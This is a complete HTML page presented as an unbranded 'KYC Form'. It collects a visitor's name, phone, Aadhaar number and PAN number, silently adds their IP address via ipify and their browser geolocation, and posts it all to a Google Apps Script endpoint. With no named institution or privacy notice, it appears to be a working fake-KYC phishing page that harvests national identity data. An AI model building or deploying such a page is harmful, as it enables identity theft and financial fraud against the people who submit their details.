<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>KYC Form</title>
</head>
<body>
  <h2>KYC Form</h2>
  <form id="kycForm">
    <input name="name" placeholder="Full Name" required><br>
    <input name="phone" placeholder="Phone Number" required><br>
    <input name="aadhaar" placeholder="Aadhaar Number" required><br>
    <input name="pan" placeholder="PAN Number" required><br>
    <button type="submit">Submit</button>
  </form>

  <p id="msg"></p>

  <script>
    document.getElementById('kycForm').addEventListener('submit', async function (e) {
      e.preventDefault();
      const form = e.target;
      const data = {
        name: form.name.value,
        phone: form.phone.value,
        aadhaar: form.aadhaar.value,
        pan: form.pan.value,
      };

      // Get IP address
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipJson = await ipRes.json();
        data.ip = ipJson.ip;
      } catch { data.ip = 'NA'; }

      // Get Geolocation (if permitted)
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (pos) => {
          data.location = `${pos.coords.latitude}, ${pos.coords.longitude}`;
          await sendData(data);
        }, async () => {
          data.location = 'Denied';
          await sendData(data);
        });
      } else {
        data.location = 'Not supported';
        await sendData(data);
      }

      async function sendData(data) {
        const msg = document.getElementById('msg');
        try {
          const res = await fetch('https://script.google.com/macros/s/AKfycbwU4wpciT4Qlc9Pzax4uSAcNM56G30UCbsWgRpJI3KRxIgBRugRDTcr9wXmgAbO_cBwpQ/exec', {
            method: 'POST',
            body: JSON.stringify(data),
            headers: { 'Content-Type': 'application/json' }
          });
          const result = await res.json();
          msg.innerText = result.status === 'success' ? 'Submitted!' : 'Error!';
        } catch (err) {
          msg.innerText = 'Failed to connect.';
        }
      }
    });
  </script>
</body>
</html>


